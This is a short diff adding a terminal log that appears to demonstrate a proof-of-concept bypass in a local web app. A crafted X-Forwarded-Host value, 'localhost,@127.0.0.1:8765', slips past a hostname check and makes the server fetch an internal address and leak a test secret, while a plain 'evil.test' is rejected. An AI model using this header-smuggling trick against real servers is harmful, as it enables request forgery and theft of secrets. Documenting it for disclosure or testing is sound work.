@@ -1,0 +1,8 @@
+$ curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100'
+<pre id="result">no-xfh
+
+$ curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' -H 'X-Forwarded-Host: localhost,@127.0.0.1:8765'
+<pre id="result">FETCH=http://127.0.0.1:8765/probe|BODY=COMMA_LEAK_SECRET_1777023959378
+
+$ curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' -H 'X-Forwarded-Host: evil.test'
+URL with hostname "evil.test" is not allowed.
